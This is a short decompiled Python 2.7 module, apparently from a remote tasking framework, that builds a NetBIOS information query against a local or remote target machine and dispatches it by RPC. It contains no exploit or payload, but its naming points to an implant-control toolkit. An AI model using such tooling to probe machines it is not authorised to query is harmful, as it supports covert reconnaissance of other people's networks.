# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_NetBios_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.netbios', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.netbios.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.network.cmd.netbios.Params()
    if lpParams['machinename'] != None:
        tgtParams.target = lpParams['machinename']
    if len(tgtParams.target) > 0:
        tgtParams.target = tgtParams.target.upper()
        if len(tgtParams.target) > 2 and tgtParams.target[0] == '\\' and tgtParams.target[1] == '\\':
            tgtParams.target = tgtParams.target[2:]
    taskXml = mcl.tasking.Tasking()
    if len(tgtParams.target) > 0:
        taskXml.SetTargetRemote(tgtParams.target)
    else:
        taskXml.SetTargetLocal()
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    rpc = mca.network.cmd.netbios.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.netbios.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)